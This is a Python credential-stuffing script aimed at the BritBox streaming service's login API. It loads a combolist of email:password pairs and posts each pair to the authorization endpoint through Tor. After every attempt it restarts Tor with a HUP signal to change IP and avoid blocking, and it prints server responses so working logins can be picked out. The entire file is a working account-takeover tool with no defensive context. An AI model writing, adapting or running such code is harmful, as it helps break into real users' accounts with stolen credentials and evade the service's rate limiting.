import requests
import time
import subprocess, shlex
from stem import Signal
from stem.control import Controller
from header import drawHeader as Look_Ma_No_Hands
#/home/roberto/Desktop/britbox
endpoint = 'https://www.britbox.co.uk/api/authorization?ff=idp%2Cldp%2Crpt&lang=en'
users=[];passwords=[]; validlist=[];No=0
a=0

def ringAroundtheRosy():
	
	newip = shlex.split('killall -HUP tor')
	subprocess.run((newip), stdout = subprocess.DEVNULL, shell = False)



while True:

	Look_Ma_No_Hands()
	combolist = input('Combolist (i.e. /home/user/combos): ')

	try:

		with open (combolist,'r') as accounts:

				for lines in accounts:
					users.append(lines.split(":")[0])
					passwords.append(lines.split("|")[0].split(":")[1])
		break

	except:

		input("\nSomething valid, Cockhead. Try again...\n (hit Enter)")
			
accounts.close()

while a<len(users):

	try:
		Look_Ma_No_Hands()
		with requests.session() as login:

			tor = {'http':'socks5h://localhost:9050', 'https':'socks5h://localhost:9050'}
			myip = login.get('http://httpbin.org/ip',proxies=tor)
			ipaddress = myip.text.split('"')[3].strip(" ")
			postResponse = login.post(endpoint, json={'email': users[No], 'password': passwords[No], 'scopes':['Catalog']}, proxies = tor)
		
			print ("Trying Combo: "+users[No]+":"+passwords[No]+" ---> IP: "+ipaddress)		
			ringAroundtheRosy()
			if 'could not be satisfied' in postResponse.text:
				a=a; No=No
			else:
				print (postResponse.text)
				a +=1; No +=1
	except:
		print("Host unreachable")
